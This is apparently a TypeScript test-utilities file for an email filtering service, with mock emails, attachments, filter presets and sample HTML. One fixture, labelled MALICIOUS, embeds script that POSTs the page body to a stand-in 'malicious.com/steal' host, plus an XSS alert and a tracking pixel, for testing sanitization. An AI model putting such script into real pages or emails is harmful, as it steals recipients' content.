/**
 * Test utilities and mock data for content filtering tests
 */

import { ParsedEmail } from '../gmail/service';
import { FilterConfig } from '@jessie/lib';

export interface MockAttachmentData {
  id: string;
  filename: string;
  mime_type: string;
  size: number;
  buffer: Buffer;
}

export interface MockEmailData {
  email: ParsedEmail;
  attachments: MockAttachmentData[];
  expectedFiltered: boolean;
  expectedReason?: string;
}

/**
 * Create mock email data for testing
 */
export function createMockEmail(overrides: Partial<ParsedEmail> = {}): ParsedEmail {
  return {
    google_message_id: 'msg123',
    thread_id: 'thread123',
    subject: 'Test Subject',
    sender: 'sender@example.com',
    recipient: 'recipient@example.com',
    body_text: 'This is the email body text.',
    body_html: '<p>This is the email body text.</p>',
    date_sent: '2024-01-01T00:00:00.000Z',
    has_attachments: false,
    ...overrides,
  };
}

/**
 * Create mock filter configuration
 */
export function createMockFilterConfig(overrides: Partial<FilterConfig> = {}): FilterConfig {
  return {
    id: 'filter123',
    user_id: 'user123',
    domain_pattern: 'spam.com',
    filter_type: 'blacklist',
    created_at: '2024-01-01T00:00:00.000Z',
    ...overrides,
  };
}

/**
 * Create mock PDF buffer with valid PDF header
 */
export function createMockPdfBuffer(content: string = 'Mock PDF content'): Buffer {
  const header = '%PDF-1.4\n';
  const body = content;
  const footer = '\n%%EOF';
  return Buffer.from(header + body + footer);
}

/**
 * Create mock DOCX buffer with valid ZIP signature
 */
export function createMockDocxBuffer(content: string = 'Mock DOCX content'): Buffer {
  // ZIP file signature (DOCX files are ZIP archives)
  const zipHeader = Buffer.from([0x50, 0x4B, 0x03, 0x04]);
  const contentBuffer = Buffer.from(content);
  return Buffer.concat([zipHeader, contentBuffer]);
}

/**
 * Create mock attachment data
 */
export function createMockAttachment(overrides: Partial<MockAttachmentData> = {}): MockAttachmentData {
  const filename = overrides.filename || 'test.pdf';
  const mime_type = overrides.mime_type || 'application/pdf';
  const buffer = overrides.buffer || createMockPdfBuffer();
  
  return {
    id: 'attachment123',
    filename,
    mime_type,
    size: buffer.length,
    buffer,
    ...overrides,
  };
}

/**
 * Sample HTML content for testing
 */
export const SAMPLE_HTML_CONTENT = {
  SIMPLE: `
    <html>
      <head><title>Simple Email</title></head>
      <body>
        <h1>Welcome</h1>
        <p>This is a simple test email.</p>
      </body>
    </html>
  `,
  
  COMPLEX: `
    <html>
      <head>
        <title>Complex Email</title>
        <meta charset="UTF-8">
        <style>body { font-family: Arial; }</style>
      </head>
      <body>
        <div class="header">
          <h1>Newsletter</h1>
          <p>Issue #123</p>
        </div>
        <div class="content">
          <h2>Featured Articles</h2>
          <ul>
            <li><a href="https://example.com/article1">Article 1</a></li>
            <li><a href="https://example.com/article2">Article 2</a></li>
          </ul>
          <table>
            <tr>
              <th>Product</th>
              <th>Price</th>
            </tr>
            <tr>
              <td>Item 1</td>
              <td>$10.00</td>
            </tr>
          </table>
          <img src="https://example.com/image.jpg" alt="Product Image" />
        </div>
        <div class="footer">
          <p><a href="mailto:unsubscribe@example.com">Unsubscribe</a></p>
        </div>
      </body>
    </html>
  `,
  
  MALICIOUS: `
    <html>
      <head>
        <script>
          alert('XSS Attack');
          document.cookie = 'stolen';
        </script>
        <style>
          body { display: none; }
        </style>
      </head>
      <body>
        <p>Visible content</p>
        <div style="display:none">Hidden tracking content</div>
        <img width="1" height="1" src="https://tracker.com/pixel.gif" />
        <script>
          fetch('https://malicious.com/steal', {
            method: 'POST',
            body: document.body.innerHTML
          });
        </script>
      </body>
    </html>
  `,
  
  MARKETING: `
    <html>
      <body>
        <h1>🎉 SPECIAL OFFER - 50% OFF!</h1>
        <p>Don't miss our amazing <strong>SALE</strong> with huge <em>discounts</em>!</p>
        <p>Limited time promotional offer with exclusive deals.</p>
        <p>Click here to shop now or <a href="unsubscribe.html">unsubscribe</a> from our newsletter.</p>
        <p>This is a promotional email from our marketing department.</p>
      </body>
    </html>
  `,
  
  AUTOMATED: `
    <html>
      <body>
        <h2>Automated System Notification</h2>
        <p>This is an automatic message from our system.</p>
        <p>Your account verification is required.</p>
        <p>This email was sent from a no-reply address.</p>
        <p>Please do not reply to this automated notification.</p>
      </body>
    </html>
  `,
};

/**
 * Test email scenarios with expected outcomes
 */
export const TEST_EMAIL_SCENARIOS: MockEmailData[] = [
  {
    email: createMockEmail({
      sender: 'colleague@company.com',
      subject: 'Meeting Tomorrow',
      body_text: 'Hi, can we schedule a meeting for tomorrow at 2 PM?',
    }),
    attachments: [],
    expectedFiltered: false,
  },
  {
    email: createMockEmail({
      sender: 'marketing@store.com',
      subject: 'Special Offer - 50% Off Everything!',
      body_text: 'Don\'t miss our incredible sale! Unsubscribe here.',
      body_html: SAMPLE_HTML_CONTENT.MARKETING,
    }),
    attachments: [],
    expectedFiltered: true,
    expectedReason: 'Marketing email detected',
  },
  {
    email: createMockEmail({
      sender: 'noreply@system.com',
      subject: 'Account Verification Required',
      body_text: 'This is an automated system notification.',
      body_html: SAMPLE_HTML_CONTENT.AUTOMATED,
    }),
    attachments: [],
    expectedFiltered: true,
    expectedReason: 'Automated/system email detected',
  },
  {
    email: createMockEmail({
      sender: 'user@blacklisted-domain.com',
      subject: 'Regular Email',
      body_text: 'This is a regular email from a blacklisted domain.',
    }),
    attachments: [],
    expectedFiltered: true,
    expectedReason: 'Blacklisted domain: blacklisted-domain.com',
  },
  {
    email: createMockEmail({
      sender: 'user@trusted-domain.com',
      subject: 'Important Business Email',
      body_text: 'This email contains important business information.',
    }),
    attachments: [],
    expectedFiltered: false,
    expectedReason: 'Whitelisted domain: trusted-domain.com',
  },
  {
    email: createMockEmail({
      sender: 'sender@example.com',
      subject: 'Email with Attachments',
      body_text: 'Please find the documents attached.',
      has_attachments: true,
    }),
    attachments: [
      createMockAttachment({
        filename: 'document.pdf',
        mime_type: 'application/pdf',
        buffer: createMockPdfBuffer('Important document content'),
      }),
      createMockAttachment({
        filename: 'report.docx',
        mime_type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        buffer: createMockDocxBuffer('Report content'),
      }),
    ],
    expectedFiltered: false,
  },
];

/**
 * Performance test data generators
 */
export class TestDataGenerator {
  /**
   * Generate large HTML content for performance testing
   */
  static generateLargeHtmlContent(paragraphs: number = 1000): string {
    let html = '<html><head><title>Large Document</title></head><body>';
    
    for (let i = 0; i < paragraphs; i++) {
      html += `<p>This is paragraph ${i} with some content that simulates real email content. `;
      html += 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. ';
      html += 'Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>';
      
      // Add some variety
      if (i % 10 === 0) {
        html += `<h2>Section ${Math.floor(i / 10)}</h2>`;
        html += '<ul>';
        for (let j = 0; j < 5; j++) {
          html += `<li>List item ${j} in section ${Math.floor(i / 10)}</li>`;
        }
        html += '</ul>';
      }
      
      if (i % 25 === 0) {
        html += '<table><tr><th>Column 1</th><th>Column 2</th></tr>';
        html += `<tr><td>Data ${i}</td><td>Value ${i}</td></tr></table>`;
      }
    }
    
    html += '</body></html>';
    return html;
  }

  /**
   * Generate batch of test emails
   */
  static generateEmailBatch(count: number, patternCount: number = 10): ParsedEmail[] {
    const patterns = [
      { sender: 'colleague@company.com', subject: 'Work Discussion', body: 'Let\'s discuss the project.' },
      { sender: 'marketing@store.com', subject: 'Special Sale!', body: 'Don\'t miss our sale! Unsubscribe here.' },
      { sender: 'noreply@service.com', subject: 'System Alert', body: 'Automated system notification.' },
      { sender: 'friend@personal.com', subject: 'Personal Message', body: 'How are you doing?' },
      { sender: 'newsletter@news.com', subject: 'Weekly Newsletter', body: 'This week\'s news digest.' },
      { sender: 'support@helpdesk.com', subject: 'Ticket Update', body: 'Your support ticket has been updated.' },
      { sender: 'notifications@social.com', subject: 'Social Update', body: 'You have new notifications.' },
      { sender: 'admin@system.com', subject: 'Maintenance Notice', body: 'Scheduled maintenance notification.' },
      { sender: 'sales@business.com', subject: 'Product Inquiry', body: 'Thank you for your interest in our products.' },
      { sender: 'team@startup.com', subject: 'Team Update', body: 'Here\'s what the team has been working on.' },
    ];

    return Array.from({ length: count }, (_, i) => {
      const pattern = patterns[i % patternCount];
      return createMockEmail({
        google_message_id: `generated-msg-${i}`,
        thread_id: `generated-thread-${i}`,
        sender: pattern.sender.replace('@', `${i}@`), // Make each sender unique
        subject: `${pattern.subject} ${i}`,
        body_text: `${pattern.body} (Email ${i})`,
        body_html: `<p>${pattern.body} (Email ${i})</p>`,
        date_sent: new Date(Date.now() - i * 60000).toISOString(), // Spread over time
      });
    });
  }

  /**
   * Generate large PDF content for testing
   */
  static generateLargePdfContent(pages: number = 10): string {
    let content = '';
    for (let page = 1; page <= pages; page++) {
      content += `\n--- Page ${page} ---\n\n`;
      content += `This is page ${page} of the test document. `;
      content += 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. '.repeat(50);
      content += `\n\nEnd of page ${page}.\f`; // Form feed for page break
    }
    return content;
  }

  /**
   * Generate large DOCX content for testing
   */
  static generateLargeDocxContent(sections: number = 5): string {
    let content = '';
    for (let section = 1; section <= sections; section++) {
      content += `Section ${section}\n\n`;
      content += `This is section ${section} of the test document. `;
      content += 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. '.repeat(100);
      content += '\n\n';
    }
    return content;
  }
}

/**
 * Filter configuration presets for testing
 */
export const FILTER_CONFIG_PRESETS = {
  STRICT: [
    createMockFilterConfig({ domain_pattern: 'marketing.com', filter_type: 'blacklist' }),
    createMockFilterConfig({ domain_pattern: 'promo.com', filter_type: 'blacklist' }),
    createMockFilterConfig({ domain_pattern: 'noreply.com', filter_type: 'blacklist' }),
    createMockFilterConfig({ domain_pattern: 'trusted-business.com', filter_type: 'whitelist' }),
  ],
  
  MODERATE: [
    createMockFilterConfig({ domain_pattern: 'spam.com', filter_type: 'blacklist' }),
    createMockFilterConfig({ domain_pattern: 'company.com', filter_type: 'whitelist' }),
  ],
  
  PERMISSIVE: [
    createMockFilterConfig({ domain_pattern: 'obvious-spam.com', filter_type: 'blacklist' }),
  ],
  
  EMPTY: [],
};

/**
 * Utility functions for testing
 */
export class TestUtils {
  /**
   * Create a temporary large buffer for memory testing
   */
  static createLargeBuffer(sizeInMB: number): Buffer {
    return Buffer.alloc(sizeInMB * 1024 * 1024, 'A');
  }

  /**
   * Measure memory usage of a function
   */
  static async measureMemoryUsage<T>(fn: () => Promise<T> | T): Promise<{
    result: T;
    memoryUsed: number; // in MB
    duration: number; // in milliseconds
  }> {
    const startMemory = process.memoryUsage().heapUsed;
    const startTime = process.hrtime.bigint();
    
    const result = await fn();
    
    const endTime = process.hrtime.bigint();
    const endMemory = process.memoryUsage().heapUsed;
    
    return {
      result,
      memoryUsed: (endMemory - startMemory) / 1024 / 1024,
      duration: Number(endTime - startTime) / 1_000_000,
    };
  }

  /**
   * Wait for a specified number of milliseconds
   */
  static async delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Generate a random string of specified length
   */
  static randomString(length: number): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  /**
   * Create a realistic email with random variations
   */
  static createRealisticEmail(type: 'personal' | 'marketing' | 'automated' | 'business' = 'personal'): ParsedEmail {
    const templates = {
      personal: {
        senders: ['friend@gmail.com', 'colleague@company.com', 'family@yahoo.com'],
        subjects: ['How are you?', 'Quick question', 'Catching up', 'Meeting next week'],
        bodies: ['Hope you\'re doing well!', 'Let\'s catch up soon.', 'Can we meet next week?'],
      },
      marketing: {
        senders: ['marketing@store.com', 'deals@shop.com', 'newsletter@retail.com'],
        subjects: ['Special Offer!', '50% OFF Sale', 'Limited Time Deal', 'Newsletter'],
        bodies: ['Don\'t miss this sale!', 'Unsubscribe here.', 'Promotional offer inside.'],
      },
      automated: {
        senders: ['noreply@service.com', 'system@app.com', 'notifications@platform.com'],
        subjects: ['Account Alert', 'System Notification', 'Verification Required'],
        bodies: ['This is an automated message.', 'No reply needed.', 'System generated.'],
      },
      business: {
        senders: ['sales@company.com', 'support@business.com', 'team@startup.com'],
        subjects: ['Proposal', 'Meeting Request', 'Project Update', 'Business Inquiry'],
        bodies: ['Please review the attached proposal.', 'Let\'s schedule a meeting.', 'Project status update.'],
      },
    };

    const template = templates[type];
    const randomIndex = Math.floor(Math.random() * template.senders.length);

    return createMockEmail({
      sender: template.senders[randomIndex],
      subject: template.subjects[randomIndex % template.subjects.length],
      body_text: template.bodies[randomIndex % template.bodies.length],
      body_html: `<p>${template.bodies[randomIndex % template.bodies.length]}</p>`,
    });
  }
}

/**
 * Mock implementations for external dependencies
 */
export const MOCK_IMPLEMENTATIONS = {
  PDF_PARSE: {
    success: (text: string, pages: number = 1) => ({
      text,
      numpages: pages,
      info: {
        Title: 'Test Document',
        Author: 'Test Author',
        Creator: 'Test Creator',
      },
    }),
    error: () => {
      throw new Error('PDF parsing failed');
    },
  },
  
  MAMMOTH: {
    success: (text: string, html: string = '<p>Test</p>') => ({
      extractRawText: () => Promise.resolve({ value: text, messages: [] }),
      convertToHtml: () => Promise.resolve({ value: html, messages: [] }),
    }),
    error: () => ({
      extractRawText: () => Promise.reject(new Error('DOCX parsing failed')),
      convertToHtml: () => Promise.reject(new Error('DOCX conversion failed')),
    }),
  },
};